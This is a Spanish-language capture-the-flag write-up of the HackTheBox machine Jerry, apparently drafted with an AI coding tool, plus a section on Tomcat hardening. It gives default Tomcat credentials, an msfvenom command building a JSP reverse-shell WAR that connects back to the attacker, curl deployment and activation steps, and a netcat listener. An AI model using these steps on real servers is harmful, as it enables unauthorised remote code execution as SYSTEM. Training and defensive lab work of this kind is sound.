---
title: Jerry (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, htb-easy, pentesting, windows, apache-tomcat, default-credentials, war-upload, rce, msfvenom, java, webapp]
type: nota
status: en-progreso
source: claude-code
aliases: [Jerry HTB, htb jerry, jerry hackthebox, tomcat default creds htb]
---

# Jerry — HackTheBox (Easy)

**SO: Windows · Dificultad: Easy · Skills: Nmap, Apache Tomcat Manager, credenciales por defecto, msfvenom WAR, reverse shell Java, RCE directo a SYSTEM**

Jerry es una de las maquinas mas directas de HTB: un Apache Tomcat con el panel Manager expuesto, credenciales por defecto sin cambiar y el servicio corriendo como SYSTEM. No hay escalada de privilegios separada porque el foothold ya entrega el maximo nivel. Ideal para entender el patron "panel de gestion mal configurado" que aparece constantemente en auditorias reales.

> HTB es un laboratorio legal y autorizado por Hack The Box para aprender pentesting de forma etica y controlada.

---

## Objetivo

Obtener ejecucion de comandos en el servidor via Tomcat Manager y capturar `user.txt` y `root.txt` (en esta maquina ambas flags estan en un mismo fichero en el Desktop del Administrator).

---

## Acceso a la maquina (paso previo)

Antes de atacar necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu archivo VPN** desde el panel de HTB (Labs -> *Access* -> descarga el `.ovpn` de tu perfil).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn lab_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine* en la pagina de Jerry). HTB te dara una **IP** (tipo `10.10.10.x` para maquinas retiradas).
4. Comprueba conectividad:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto del writeup, **sustituye `<IP>` por la IP que te asigne HTB** (es dinamica: cambia en cada sesion).

> Las maquinas retiradas como Jerry requieren **suscripcion VIP**. Las maquinas activas del pool semanal son gratuitas. El **Pwnbox** (Kali en el navegador de HTB) ya viene conectado a la red; solo tienes que lanzar la maquina y usar su IP directamente.

---

## Reconocimiento

**Categoria: enumeracion de puertos y servicios.**

```bash
nmap -sC -sV -oN jerry.nmap <IP>
```

Resultado relevante:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 8080/tcp | HTTP | Apache Tomcat/Coyote JSP engine |

Solo un puerto abierto. Nmap identifica la version de Tomcat (suele ser 7.0.88 en esta maquina). Abrir el navegador en `http://<IP>:8080` muestra la pagina de bienvenida por defecto de Tomcat — confirmacion de que el servidor esta activo y no hay ninguna aplicacion personalizada en `/`.

---

## Enumeracion

**Categoria: descubrimiento de panel de gestion expuesto + prueba de credenciales por defecto.**

### Panel Tomcat Manager

Tomcat incluye una aplicacion de administracion en `/manager/html` que permite desplegar, arrancar y detener aplicaciones `.WAR`. Esta ruta es conocida y lo primero que se comprueba:

```
http://<IP>:8080/manager/html
```

El servidor responde con un dialogo de autenticacion HTTP Basic. Probar credenciales por defecto de Tomcat:

| Usuario | Contrasena (tipica) |
|---------|---------------------|
| `tomcat` | `tomcat` |
| `admin`  | `admin`  |
| `tomcat` | `s3cret` |

En Jerry, la combinacion `tomcat` / `s3cret` funciona y da acceso al Manager. Esta credencial aparece en el fichero `tomcat-users.xml` que viene de ejemplo en la instalacion oficial de Tomcat y que muchos administradores no cambian.

> Si necesitas hacer fuerza bruta sistematica, Metasploit tiene el modulo `auxiliary/scanner/http/tomcat_mgr_login` que prueba un diccionario de credenciales conocidas contra el Manager. En Jerry no hace falta: la credencial por defecto funciona directamente.

---

## Acceso inicial (foothold)

**Categoria: despliegue de WAR malicioso en Tomcat Manager → RCE → shell como SYSTEM.**

El salto respecto a Starting Point es que aqui el foothold no es un comando SQL ni un LFI: es un **despliegue de aplicacion Java** que el propio servidor ejecuta. El Tomcat Manager acepta ficheros `.WAR` (Web Application Archive) y los despliega como aplicaciones web. Un `.WAR` con un JSP de reverse shell se convierte en un endpoint que ejecuta codigo en el servidor.

### Paso 1 — Generar el payload WAR con msfvenom

`msfvenom` es la herramienta de Metasploit para generar payloads. El formato `-f war` empaqueta el payload JSP dentro de un archivo WAR listo para desplegar:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f war -o shell.war
```

- `-p java/jsp_shell_reverse_tcp`: payload que genera una JSP con una reverse shell TCP.
- `LHOST`: tu IP en la red de HTB (la que ves en `ip addr` para la interfaz `tun0`).
- `LPORT`: el puerto en el que escucharas.
- `-f war`: formato de salida WAR.
- `-o shell.war`: nombre del fichero de salida.

Lo que hace internamente: `msfvenom` crea un fichero `.jsp` que, al ser invocado via HTTP, abre un socket TCP hacia `LHOST:LPORT` y redirige stdin/stdout/stderr a ese socket, entregando una shell interactiva.

### Paso 2 — Desplegar el WAR desde el Manager

En la interfaz web del Manager (`http://<IP>:8080/manager/html`), hay una seccion **"WAR file to deploy"**. Selecciona `shell.war` y pulsa *Deploy*. Alternativamente, con `curl` (mas repetible):

```bash
curl -u tomcat:s3cret -T shell.war "http://<IP>:8080/manager/deploy?path=/shell&update=true"
```

El Manager confirma que la aplicacion `/shell` esta desplegada y en estado *running*.

### Paso 3 — Abrir listener y activar la shell

Abrir el listener en la maquina atacante:

```bash
nc -lvnp 4444
```

Activar la JSP haciendo una peticion HTTP al endpoint desplegado:

```bash
curl http://<IP>:8080/shell/
```

El nombre exacto del fichero JSP dentro del WAR puede variar segun la version de msfvenom (suele generarse con un nombre aleatorio). Si `curl http://<IP>:8080/shell/` no dispara la conexion, lista el contenido del WAR con `jar tf shell.war` y accede al `.jsp` directamente:

```bash
curl "http://<IP>:8080/shell/<nombre_generado>.jsp"
```

Al ejecutarse la JSP, el listener recibe la conexion. El resultado de `whoami` es:

```
nt authority\system
```

La shell ya es SYSTEM. No hay escalada de privilegios adicional: el servicio Tomcat fue instalado y configurado para correr con la cuenta `SYSTEM`, la de maximo privilegio en Windows.

---

## Escalada de privilegios

**No aplica en Jerry.** El foothold entrega directamente `NT AUTHORITY\SYSTEM`. Este es precisamente uno de los puntos de ensenanza de la maquina: cuando un servicio corre con privilegios maximos, comprometer ese servicio = comprometer el sistema completo, sin pasos intermedios.

---

## Flags

En Jerry, ambas flags estan contenidas en un **unico fichero de texto** en el Desktop del Administrator:

| Fichero | Ruta |
|---------|------|
| `2 for the price of 1.txt` | `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt` |

Leerlo desde la shell obtenida:

```
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

El fichero muestra las dos flags:

```
user.txt
<flag>

root.txt
<flag>
```

Los valores reales son dinamicos por sesion de HTB.

---

## Patron y teoria

**Esta es la seccion mas importante: los patrones que se repiten y como defenderse.**

### Patron 1 — Panel de gestion expuesto con credenciales por defecto

**Categoria: misconfiguration / default credentials (CWE-1392, OWASP A05:2021 Security Misconfiguration).**

El patron: un panel de administracion web (Tomcat Manager, Jenkins, Kibana, phpMyAdmin, Grafana...) queda accesible desde la red con las credenciales que vienen de fabrica en la instalacion. El atacante no necesita explotar ninguna vulnerabilidad: la credencial es publica y documentada.

Este patron es **endemico** en infraestructuras reales. Los servicios se despliegan rapido para probar y nadie cambia las credenciales de ejemplo. El fichero `tomcat-users.xml` con `tomcat/s3cret` aparece literalmente en la documentacion oficial de Tomcat como ejemplo, y miles de servidores lo tienen en produccion.

**Defensa / diseno:**
- Cambiar **todas** las credenciales por defecto antes de cualquier despliegue, incluidos entornos de desarrollo que puedan quedar expuestos.
- Eliminar o deshabilitar el Tomcat Manager en produccion si no es imprescindible. Si se necesita, restringir el acceso por IP en `context.xml` (el Manager ya viene con una regla que solo permite `localhost` en versiones modernas de Tomcat; verificar que no se ha revertido).
- Auditar periodicamente los paneles de gestion expuestos con herramientas como `nuclei` (tiene plantillas para credenciales por defecto de cientos de productos).
- Usar un gestor de contrasenas o un sistema de secrets rotation para credenciales de infraestructura.

### Patron 2 — Despliegue de WAR como primitiva de RCE

**Categoria: arbitrary file upload → Remote Code Execution.**

El patron: el Tomcat Manager esta disenado para desplegar aplicaciones. Un WAR malicioso es una aplicacion que ejecuta una shell. El vector no es una vulnerabilidad en el codigo de Tomcat (no hay CVE aqui): es el **uso legitimo de una funcionalidad de gestion** con credenciales comprometidas.

Esto ilustra un principio importante para desarrolladores: **las funcionalidades de administracion son superficie de ataque**. Un panel que puede desplegar codigo arbitrario debe estar protegido con la misma seriedad que el acceso a produccion.

**Defensa / diseno:**
- Autenticacion fuerte en cualquier endpoint que permita desplegar o ejecutar codigo (2FA, certificados de cliente, IP allowlist).
- En pipelines CI/CD modernos, el despliegue no lo hace una persona contra un panel web: lo hace un sistema automatizado con credenciales efimeras y rotadas. Eliminar el acceso humano directo al Manager en produccion.
- Si el Manager es necesario, exponerlo solo en red interna o via VPN, nunca directamente a internet.

### Patron 3 — Servicio corriendo como SYSTEM (over-privileged service)

**Categoria: privilege misconfiguration / least privilege violation.**

El patron: el proceso de Tomcat se configuro para ejecutarse como `NT AUTHORITY\SYSTEM` en lugar de una cuenta de servicio de baja privilegios. Cuando ese proceso es comprometido, el atacante hereda SYSTEM directamente.

En Windows, un servicio bien configurado corre como una **cuenta de servicio local** (Local Service, Network Service) o como una cuenta de dominio con permisos minimos. SYSTEM solo debe asignarse cuando la tarea especifica lo requiere de forma justificada.

**Defensa / diseno:**
- Crear cuentas de servicio dedicadas con permisos estrictamente necesarios (acceso solo a los directorios de la aplicacion, sin acceso a escritura en `C:\Windows\`, sin capacidad de crear procesos con privilegios).
- En Windows, usar **Managed Service Accounts (MSA)** o **Group Managed Service Accounts (gMSA)** para servicios de red: rotan su contrasena automaticamente y no requieren gestion manual.
- Aplicar **AppLocker** o **Windows Defender Application Control** para restringir que ejecutables pueden lanzar servicios como Tomcat.
- Monitorizar procesos hijo de `tomcat.exe` o `java.exe`: un `cmd.exe` o `powershell.exe` hijo de Tomcat es una senyal de alerta critica (deteccion SIEM).

### Vision global — cadena de ataque (y por que es tan corta)

```
Puerto 8080 abierto (Apache Tomcat)
  → /manager/html accesible sin restriccion de red
    → credenciales por defecto tomcat/s3cret validas
      → despliegue de WAR malicioso (msfvenom java/jsp_shell_reverse_tcp)
        → JSP ejecutada → reverse shell
          → NT AUTHORITY\SYSTEM  (sin privesc adicional)
```

La cadena tiene solo cuatro eslabones y cada uno es un fallo de configuracion, no una vulnerabilidad de software. Romper **cualquiera** de ellos detiene el ataque:

- Red: Tomcat Manager no accesible externamente → fin del ataque.
- Auth: credenciales fuertes → fin del ataque.
- Funcionalidad: Manager deshabilitado en produccion → fin del ataque.
- Privilegios: Tomcat como cuenta restringida → shell sin SYSTEM, necesidad de privesc adicional.

**El salto respecto a Starting Point:** en maquinas de Starting Point cada skill se entrena de forma aislada. En Jerry la cadena es real pero corta; en maquinas Easy mas complejas (Lame, Legacy, Blue) aparecen CVEs con exploit publico (EternalBlue CVE-2017-0144, Samba CVE-2007-2447) que requieren entender el funcionamiento del exploit, no solo lanzarlo. Jerry es el puente: misma logica de cadena, sin CVE, toda la superficie es configuracion.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
- [[13-herramientas-en-detalle]]
- [[07-pentesting-y-ciclo-del-ataque]]
- [[06-seguridad-de-sistemas-y-hardening]]
